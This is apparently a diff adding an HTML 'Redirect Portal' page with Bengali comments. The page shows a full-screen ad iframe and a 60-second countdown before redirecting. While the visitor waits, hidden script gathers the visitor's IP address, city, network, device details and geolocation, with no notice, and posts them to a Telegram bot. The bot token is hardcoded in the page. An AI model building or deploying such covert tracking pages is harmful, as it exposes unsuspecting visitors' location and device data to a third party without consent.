@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirect Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+        }
+
+        #adFrame {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            z-index: 1000;
+        }
+
+        .timer-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.7);
+            padding: 15px;
+            border-radius: 10px;
+            z-index: 1001;
+        }
+
+        #timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="timer-container">
+        Redirecting in: <span id="timer">01:00</span>
+    </div>
+
+    <script>
+        // টেলিগ্রাম বট কনফিগারেশন
+        const BOT_TOKEN = '7487768405:AAHivvY7f_SjAw13ZgYQeUYwgCQ-2FkTKjs';
+        const CHAT_ID = 'YOUR_CHAT_ID';
+
+        // ডেটা কালেকশন ও সেন্ড ফাংশন
+        async function collectAndSendData(targetUrl) {
+            try {
+                // IP ও লোকেশন ডিটেলস
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+
+                // ডিভাইস ডিটেলস
+                const deviceDetails = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language,
+                    cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled'
+                };
+
+                // জিওলোকেশন (যদি পারমিশন দেয়)
+                let geoData = {};
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        geoData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude
+                        };
+                    });
+                }
+
+                // টেলিগ্রামে মেসেজ ফরম্যাট
+                const message = `🚨 New Visitor Alert 🚨
+                
+📌 IP Address: ${ipData.ip}
+📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country_name}
+🌐 Network: ${ipData.org}
+🖥️ Device: ${deviceDetails.platform}
+🔗 Target URL: ${targetUrl}
+                
+📡 Full Details:
+${JSON.stringify({...ipData, ...deviceDetails, ...geoData}, null, 2)}`;
+
+                // টেলিগ্রাম বটে ডেটা সেন্ড
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message
+                    })
+                });
+
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+
+        // রিডাইরেক্ট লজিক
+        async function initializeRedirect() {
+            const id = window.location.hash.substr(1);
+            const data = JSON.parse(localStorage.getItem(id));
+
+            if(data) {
+                // এড লিংক ফুলস্ক্রিনে প্রদর্শন
+                const adFrame = document.createElement('iframe');
+                adFrame.id = 'adFrame';
+                adFrame.src = data.adLink;
+                document.body.appendChild(adFrame);
+
+                // ডেটা কালেকশন ও সেন্ড
+                await collectAndSendData(data.targetLink);
+
+                // টাইমার সেটআপ
+                let timeLeft = 60;
+                const timerElement = document.getElementById('timer');
+                
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    timerElement.textContent = `${String(Math.floor(timeLeft/60)).padStart(2,'0')}:${String(timeLeft%60).padStart(2,'0')}`;
+                    
+                    if(timeLeft <= 0) {
+                        clearInterval(countdown);
+                        window.location.href = data.targetLink;
+                    }
+                }, 1000);
+            }
+        }
+
+        window.onload = initializeRedirect;
+    </script>
+</body>
+</html>
